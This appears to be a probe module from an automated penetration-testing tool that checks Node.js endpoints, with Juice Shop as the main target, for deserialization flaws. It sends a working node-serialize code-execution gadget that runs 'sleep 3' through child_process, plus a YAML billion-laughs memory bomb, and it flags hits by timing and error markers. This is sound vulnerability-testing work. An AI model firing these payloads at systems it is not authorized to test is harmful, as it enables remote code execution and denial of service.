"""Node.js deserialization RCE / DoS probe.

Targets `node-serialize`-style sinks (vulnerable < 0.0.5) and `js-yaml`
billion-laughs expansion. Juice Shop's POST /b2b/v2/orders is the canonical
sink: the body is run through `node-serialize.unserialize()` which executes
any object containing `_$$ND_FUNC$$_`.

Three-step shape per endpoint:

  1. Baseline: clean body, note status + elapsed seconds.
  2. Attack 1 (RCE gadget): `_$$ND_FUNC$$_` payload that runs `sleep 3`.
     If elapsed >= baseline + 3.0 seconds OR known JS error markers appear,
     emit a CRITICAL finding (server-side function execution).
  3. Attack 2 (memory bomb): YAML billion-laughs equivalent. If elapsed
     >= 5 seconds OR status in {500, 503} with parser-error body, emit
     a HIGH finding (denial of service).

Endpoints walked: /b2b/v2/orders, /api/orders, /api/serialize,
/api/deserialize, /api/parse. The probe stops walking an endpoint once
it finds a hit on it (one finding per endpoint).

False-positive guards:
  * If the baseline itself takes >= 3.0 seconds, the timing signal is
    discarded (the host is just slow).
  * 404 / 0 status responses are treated as "endpoint absent" and skipped.
"""
from __future__ import annotations

import asyncio
import logging
from time import monotonic
from typing import Any

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_post_json

logger = logging.getLogger("pentest-ai.probes.web.deserialization")

ENDPOINTS: tuple[str, ...] = (
    "/b2b/v2/orders",
    "/api/orders",
    "/api/serialize",
    "/api/deserialize",
    "/api/parse",
)

# Per-request timeout. Sleep 3 plus network slack; bounded so a hung host
# can't consume the entire probe budget on one endpoint.
_REQ_TIMEOUT_S = 6.0

# Detection thresholds.
_RCE_TIME_DELTA_S = 3.0
_DOS_TIME_S = 5.0
_BASELINE_SLOW_CUTOFF_S = 3.0
_DOS_STATUSES: frozenset[int] = frozenset({500, 503})

# Markers in response body that indicate the gadget actually ran or that
# js-yaml/node-serialize blew up server-side.
_RCE_BODY_MARKERS: tuple[str, ...] = (
    "[object Object]",
    "ReferenceError",
    "process.exit",
    "child_process",
    "_$$ND_FUNC$$_",
)
_DOS_BODY_MARKERS: tuple[str, ...] = (
    "out of memory",
    "JavaScript heap",
    "RangeError",
    "Maximum call stack",
    "YAMLException",
    "parser error",
)

# node-serialize gadget: unserialize() invokes any object whose key is
# `_$$ND_FUNC$$_`. The trailing `()` makes it self-execute on parse.
_RCE_PAYLOAD_VALUE = (
    '[{"_$$ND_FUNC$$_": "function(){'
    'require(\\"child_process\\").exec(\\"sleep 3\\", function(){})'
    "}()\"}]"
)

# js-yaml / general parser memory bomb. Sent via the same JSON envelope
# Juice Shop accepts on /b2b/v2/orders (the bodyParser handles both shapes).
_MEMORY_BOMB_VALUE = (
    "a: &a [1,2,3]\n"
    "b: &b [*a, *a, *a]\n"
    "c: &c [*b, *b, *b]\n"
    "d: &d [*c, *c, *c]\n"
    "e: &e [*d, *d, *d]\n"
    "f: &f [*e, *e, *e]\n"
)

_BASELINE_BODY: dict[str, Any] = {"orderLinesData": "simple"}
_RCE_BODY: dict[str, Any] = {"orderLinesData": _RCE_PAYLOAD_VALUE}
_DOS_BODY: dict[str, Any] = {"orderLinesData": _MEMORY_BOMB_VALUE}


async def _timed_post(
    session: Any,
    url: str,
    payload: dict[str, Any],
) -> tuple[int, str, float]:
    """POST with a hard per-request timeout. Returns (status, body, elapsed_s).

    On timeout or transport failure, status is 0 and elapsed reflects
    wall-clock time spent waiting (capped at _REQ_TIMEOUT_S).
    """
    start = monotonic()
    try:
        status, _headers, body = await asyncio.wait_for(
            http_post_json(session, url, payload),
            timeout=_REQ_TIMEOUT_S,
        )
    except asyncio.TimeoutError:
        return 0, "", monotonic() - start
    except Exception as exc:  # noqa: BLE001
        logger.debug("POST %s failed: %s", url, exc)
        return 0, "", monotonic() - start
    return status, body, monotonic() - start


def _endpoint_absent(status: int) -> bool:
    """0 (transport failure) or 404 means we should skip this endpoint."""
    return status == 0 or status == 404


def _has_marker(body: str, markers: tuple[str, ...]) -> bool:
    return any(m in body for m in markers)


def _emit_rce(target: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"Node.js deserialization RCE on {target}",
        "severity": "critical",
        "category": "injection",
        "target": target,
        "evidence": evidence[:400],
        "bug_class": "rce_deserialization",
        "remediation": (
            "Stop deserializing untrusted input. Replace `node-serialize` "
            "with a safe schema-validated parser; reject any payload "
            "containing `_$$ND_FUNC$$_`."
        ),
    }


def _emit_dos(target: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"Deserialization-driven DoS on {target}",
        "severity": "high",
        "category": "denial_of_service",
        "target": target,
        "evidence": evidence[:400],
        "bug_class": "rce_deserialization",
        "remediation": (
            "Use js-yaml's safeLoad with FAILSAFE_SCHEMA, cap input size, "
            "and reject anchors/aliases on untrusted YAML."
        ),
    }


@registry.probe(
    name="web.deserialization",
    bug_class="rce_deserialization",
    severity_max="critical",
    owasp="A08:2021",
    runtime_budget_s=20.0,
    tags=("anonymous", "high-roi", "destructive-low"),
    requires_auth=False,
)
async def probe_deserialization(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Walk Juice Shop-style deserialization sinks; emit findings on hit."""
    findings: list[dict[str, Any]] = []
    base = ctx.base.rstrip("/")

    for path in ENDPOINTS:
        url = base + path

        # Step 1: baseline. Skip endpoint if absent.
        b_status, _b_body, b_elapsed = await _timed_post(
            ctx.session, url, _BASELINE_BODY
        )
        if _endpoint_absent(b_status):
            continue

        # If the host is just slow on this endpoint already, timing
        # signals are unreliable. Skip the time-based detector but
        # still check the memory-bomb status code.
        baseline_slow = b_elapsed >= _BASELINE_SLOW_CUTOFF_S

        # Step 2: RCE gadget.
        r_status, r_body, r_elapsed = await _timed_post(
            ctx.session, url, _RCE_BODY
        )
        rce_hit = False
        rce_evidence = ""
        if not _endpoint_absent(r_status):
            time_signal = (
                not baseline_slow
                and (r_elapsed - b_elapsed) >= _RCE_TIME_DELTA_S
            )
            body_signal = _has_marker(r_body, _RCE_BODY_MARKERS)
            if time_signal or body_signal:
                rce_hit = True
                rce_evidence = (
                    f"baseline={b_elapsed:.2f}s attack={r_elapsed:.2f}s "
                    f"status={r_status} body={r_body[:160]}"
                )

        if rce_hit:
            findings.append(_emit_rce(url, rce_evidence))
            # One finding per endpoint is enough; move on.
            continue

        # Step 3: memory bomb DoS.
        d_status, d_body, d_elapsed = await _timed_post(
            ctx.session, url, _DOS_BODY
        )
        if _endpoint_absent(d_status):
            continue

        time_signal = not baseline_slow and d_elapsed >= _DOS_TIME_S
        status_signal = (
            d_status in _DOS_STATUSES and _has_marker(d_body, _DOS_BODY_MARKERS)
        )
        if time_signal or status_signal:
            evidence = (
                f"baseline={b_elapsed:.2f}s attack={d_elapsed:.2f}s "
                f"status={d_status} body={d_body[:160]}"
            )
            findings.append(_emit_dos(url, evidence))

    return findings
